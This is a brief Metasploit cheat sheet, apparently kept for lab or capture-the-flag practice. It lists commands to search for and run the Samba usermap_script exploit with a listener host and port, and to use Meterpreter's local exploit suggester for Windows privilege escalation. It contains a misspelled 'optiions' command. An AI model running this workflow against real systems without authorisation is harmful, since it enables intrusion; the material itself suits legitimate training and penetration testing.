---
title: "Metasploit"
date: 2024-6-28
tags: ["metasploit", "exploit", "vuln", "CVE", "privesc", "meterpreter", "Windows", "msfconsole"]
---

---
### Metasploit

#### Start Metasploit

```bash
msfconsole -q
```

#### Basic Commands

```bash
# Return to previous page
back

# quit metasploit
exit
```

#### Search Exploit

```bash
# For example: samba
search samba

# Choose by # or name
use 15
use exploit/multi/samba/usermap_script

# Show exploit settings
optiions

# Set option, e.g.
set rhosts 10.10.11.10
set lhost 10.10.14.10
set lport 1337

# Run exploit
run 
```

<small>*Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter*</small>

---
### Meterpreter

#### Basic Commands

```bash
# Return from meterpreter
background
```

#### Use Exploit

```bash
# Quick look of potential privesc (Windows)
# Need to return from meterpreter
use post/multi/recon/local_exploit_suggester

# Select opened session
set session 1

# Show exploit settings
optiions

# Set option, e.g.
set rhosts 10.10.11.10

# Run exploit
run 
```

<br>